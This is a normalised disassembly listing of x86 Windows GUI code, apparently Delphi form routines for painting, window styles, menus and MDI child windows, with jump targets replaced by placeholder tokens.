mov eax [ eax - 0x4 ]
call sub_457f68
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_457fb4
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_457acc
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_457c9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4422ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43d93c
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43c734
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_457a40
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41dc20
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_457f68
test eax eax
je r-xdata
push ebp
call sub_457a40
pop ecx
push ebp
call sub_457a40
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_457a8c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_454da4
jmp r-xdata
sub_457cac
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_455f74
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_457d18
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_456610
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax ebx
call sub_41a708
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44141c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4445f8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a6dc
call sub_4520ac
mov edx esi
mov eax ebx
call sub_41a6dc
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
sub_457db0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_457e2d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_457e38
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_441b98
sub_457e64
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_441b98
xor edx edx
jmp r-xdata
mov eax esi
call sub_4560f0
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_457e9c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43d5fc
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_441b98
sub_457ee0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d708
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_457f34
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_43ac84
sub_457f68
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45bad8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45bac4
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_457fb4
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45bad8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45bac4
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_458004
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413c88
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_458034
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4445f8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45baa8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45baa8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_458004
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45baa8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ba94
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413de4
call sub_4032a0
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ba94
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ba94
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45ba94
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_458138
push ebx
mov ebx eax
mov eax ebx
call sub_458130
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_423acc
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_458160
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_441b50
mov dl 0x1
mov eax esi
call sub_4584c4
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_458540
mov edx eax
mov eax esi
call sub_43df98
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_441cec
mov dl 0x1
mov eax esi
call sub_4574e4
sub_4581e0
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4445f8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44e6a8
mov edi eax
mov eax ebp
call sub_4445f8
push eax
call DrawMenuBar
sub_45825c
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_41a1b4
xor edx edx
mov eax ebx
call sub_450040
sub_458280
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_4581e0
mov eax edx
mov edx ebx
call sub_41a1b4
sub_4582a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45846e
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45bad8
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_451bf4
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bac4
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_41a1b4
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45bac4
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b678
call sub_403a2c
mov eax ebx
call sub_4448fc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4581e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458475
lea eax [ ebp - 0x10 ]
call sub_404074
retn
mov dl 0x1
mov eax ebx
call sub_45936c
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4445f8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4445f8
mov edx eax
mov eax esi
call sub_451bf4
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call SetMenu
sub_458490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45847c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_4584ec
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4584e0
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_458558
push ebx
mov ebx eax
mov eax ebx
call sub_443c10
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_458540
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_458540
mov edx eax
mov eax ebx
call sub_43df98
mov edx 0xff00000f
mov eax ebx
call sub_43df98
pop ebx
retn
sub_4585dc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_4445f8
push eax
call ShowWindow
sub_45861c
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_458034
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_458034
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45baa8
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45ba94
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_458034
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45baa8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45ba94
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b77c
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b7b0
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b77c
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b7b0
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b77c
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b7b0
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b764
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b7b0
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b798
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45ba94
call sub_45b77c
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_458970
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_455f24
mov edx esi
mov eax edi
call sub_45b314
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_458a1f ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44141c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44141c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_458b81
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_455f34
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
mov eax ebx
call sub_4594e0
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4445f8
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43d7fc
push eax
mov eax ebx
call sub_43d840
push eax
mov eax ebx
call sub_4445f8
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406b50
mov [ ebx + 0x254 ] eax
push ebx
push sub_457acc
call sub_41b174
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44e6a8
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
jmp r-xdata
sub_458cce
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_458df9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_441780
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_45b1ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458e00
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
